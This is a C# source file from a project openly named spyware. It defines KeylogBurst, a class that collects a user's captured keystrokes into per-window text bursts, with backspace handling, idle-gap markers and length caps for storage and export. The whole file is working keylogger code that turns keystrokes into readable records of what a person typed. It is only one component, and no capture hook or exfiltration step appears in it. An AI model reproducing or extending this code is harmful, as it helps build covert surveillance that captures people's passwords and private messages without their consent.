using System.Text;

namespace Spyware.Collectors.Keyboard;

/// <summary>
/// Ráfaga de pulsaciones: texto acumulado entre pausas. Se guarda una fila por ráfaga,
/// no por tecla (una persona escribe 60 pulsaciones por minuto: por tecla la base y la
/// exportación se llenarían de inmediato).
/// </summary>
public sealed class KeylogBurst
{
    private readonly StringBuilder _text = new();

    public KeylogBurst(WindowInfo window, DateTime startedUtc)
    {
        Window = window;
        StartedUtc = startedUtc;
        LastKeyUtc = startedUtc;
    }

    public WindowInfo Window { get; }
    public DateTime StartedUtc { get; }
    public DateTime LastKeyUtc { get; private set; }
    public int KeyCount { get; private set; }
    public int CharCount => _text.Length;

    /// <summary>La ráfaga alcanzó el tope de caracteres y se cortó.</summary>
    public bool Overflowed { get; private set; }

    public string Text => _text.ToString();

    public void RegisterKey(DateTime utc)
    {
        KeyCount++;
        LastKeyUtc = utc;
    }

    /// <summary>Devuelve false si ya no cabe nada (el servicio debe cerrar la ráfaga).</summary>
    public bool Append(string fragment, int maxCharacters)
    {
        if (string.IsNullOrEmpty(fragment)) return _text.Length < maxCharacters;

        if (_text.Length + fragment.Length > maxCharacters)
        {
            int room = maxCharacters - _text.Length;
            if (room > 0) _text.Append(fragment[..room]);
            Overflowed = true;
            return false;
        }

        _text.Append(fragment);
        return true;
    }

    /// <summary>
    /// Inserta un separador visible cuando ha pasado una pausa larga entre dos ráfagas
    /// dentro de la misma ventana: conserva el orden temporal sin abrir una fila nueva.
    /// </summary>
    public bool AppendGap(DateTime utc, int thresholdSeconds, int maxCharacters)
    {
        if (thresholdSeconds <= 0) return true;

        double idle = (utc - LastKeyUtc).TotalSeconds;
        if (idle < thresholdSeconds) return true;

        return Append(KeyTranslator.Separator((int)idle), maxCharacters);
    }

    /// <summary>Retroceso: borra el último carácter capturado.</summary>
    public void Backspace()
    {
        if (_text.Length > 0) _text.Length--;
    }

    public bool IsIdle(DateTime utc, int milliseconds) =>
        (utc - LastKeyUtc).TotalMilliseconds >= milliseconds;

    public bool IsFull(int maxCharacters) => _text.Length >= maxCharacters;

    public bool IsSameWindowAs(IntPtr handle) => Window.IsSameWindowAs(handle);
}
